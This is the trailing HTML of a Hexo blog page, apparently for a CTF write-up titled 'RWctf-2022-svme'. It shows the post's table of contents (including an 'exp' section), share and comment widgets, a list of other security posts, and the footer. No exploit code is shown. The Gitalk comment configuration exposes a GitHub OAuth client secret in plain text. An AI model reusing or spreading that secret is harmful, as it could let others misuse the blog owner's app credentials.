+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#svme"><span class="toc-number">1.</span> <span class="toc-text">svme</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">分析源码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E9%9B%86%E4%B8%8E%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.1.1.</span> <span class="toc-text">指令集与结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vm-create"><span class="toc-number">1.1.2.</span> <span class="toc-text">vm_create</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vm-exec"><span class="toc-number">1.1.3.</span> <span class="toc-text">vm_exec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step1-get-host-stack"><span class="toc-number">1.2.1.</span> <span class="toc-text">step1: get host stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step2"><span class="toc-number">1.2.2.</span> <span class="toc-text">step2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step3"><span class="toc-number">1.2.3.</span> <span class="toc-text">step3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step4"><span class="toc-number">1.2.4.</span> <span class="toc-text">step4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">1.2.5.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">逆向分析</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"RWctf-2022-svme　| welc0me　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+<!-- 
+    
+ -->
+
+
+  
+      <section id='comments' style='margin: 2em; padding: 2em; background: rgba(255, 255, 255, 0.5)'>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+    <div id="gitalk-container"></div>
+    <script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'fb4ffdde2e800246e49f',
+        clientSecret: 'b550860fb0906da0fc324e3c81448cd676b55f9e',
+        repo: 'nicholas-wei.github.io',
+        owner: 'nicholas-wei',
+        admin: ['nicholas-wei'],
+        id: window.location.pathname
+      })
+      gitalk.render('gitalk-container')
+    </script>
+  </section>
+  
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/" title="上一篇: hws2022冬令营入营赛pwn">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2022/01/24/kernel-2-stkof/" title="下一篇: kernel-2-stkof">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/07/12/testfile/">testfile</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/03/decrypt-wechat-db/">decrypt-wechat-db</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/02/tamuctf-pwnme/">tamuctf-pwnme</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/03/20/ej/">ej</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/07/royal_ransomeware/">royal_randomeware analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/05/mirai/">mirai_botnet_analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/26/corctf2022-corchat/">corctf2022-corchat</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/24/bi0sctf-2023/">bi0sctf-2023</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/20/rwctf-tinyvm/">rwctf-tinyvm</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/19/wasm-pwn/">wasm-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/12/27/ics-pa1/">ics-pa</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/11/13/llvm-pass1/">llvm-pass1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/leetcode-1/">leetcode-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/28/dp/">dp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/">Directed_Grey-Box_Fuzzing_with_Provable_Path_Pruning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/">Constraint-guided_Directed_Greybox_Fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/10/crafting-interpreters4/">crafting-interpreters4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/07/crafting-interpreters3/">crafting-interpreters3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/04/crafting-interpreters2/">crafting-interpreters2——scanning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/02/house-of-cat/">house-of-cat</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/29/crafting-interpreters1/">crafting_interpreters 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/28/dice2022-hope/">dice2022@hope</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/30/software-security-lab6/">software-security-lab6</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/software-security-lab5/">software-security-lab5</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/volgaCTF2022-pwn/">volgaCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/08/pyjail/">pyjail</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/angstormCTF2022-pwn/">angstormCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/04/software-security-lab4/">software-security-lab4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/27/pwnhub2022/">pwnhub2022_easyrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/25/b01lersCTF2022-pwn/">b01lersCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/15/hackpark2022-shiftycode/">hackpark2022_shiftycode</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/14/input_check_lab/">software-security-lab3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/software-security-lab2/">software-security-lab2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/matlab-2/">matlab-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/FuzzBuilder-src-understand/">FuzzBuilder_src_understand</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/SpaceHeroCTF2022-pwn-wp/">SpaceHeroCTF2022_pwn_wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/fb-bot-discord/">fb-bot_discord</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/31/matlab-1/">matlab-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/29/zer0pts2022-accountant/">zer0pts2022_accountant</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/17/fuzzing-6-grammer-fuzzing/">fuzzing-6-grammer_fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/16/fuzzing-5-parallelize/">fuzzing-5-parallelize</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/15/fuzzing-4-code_coverage/">fuzzing-4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/13/fuzzing-2/">fuzzing-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/software-security-lab1/">software-security_lab1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/fuzzing-1-gegeral-knowledge/">fuzzing-1-gegeral_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/07/umdctf2022-pwn/">umdctf2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/06/kernel-6-HijackPrctl/">kernel-6-HijackPrctl</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/02/pwnable-re-alloc-revenge/">pwnable-re-alloc_revenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/28/SUSCTF2022-pwn/">SUSCTF2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/tqlctf-nemu/">tqlctf-nemu</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/fastbin-reverse-into-tcache/">fastbin-reverse-into-tcache</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/15/kernel-5-bypass-smep1/">kernel-5-bypass_smep1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/14/pwnable-babystack/">pwnable-babystack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/11/kernel-4-doubleFetch/">kernel-4-doubleFetch</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/07/tcache-stashing-unlink-attack/">tcache-stashing-unlink-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/03/IO-file-vtable/">IO_file常见利用方法&原理(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/01/pwnable-realloc/">pwnable-realloc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/31/kernel-3-UAF/">kernel-3-UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/IO-file/">IO_file常见利用方法&原理(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/largebin-attack/">largebin-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/">hws2022冬令营入营赛pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/27/RWctf-2022-svme/">RWctf-2022-svme</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/24/kernel-2-stkof/">kernel-2-stkof</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/23/kernel-1-basic_knowledge/">kernel-1-basic_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/22/Drangonctf2021-noflippidy/">Drangonctf2021-noflippidy</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/21/dicectf2021-flippidy/">dicectf2021_flippidy</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2022-2023 nich0las
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
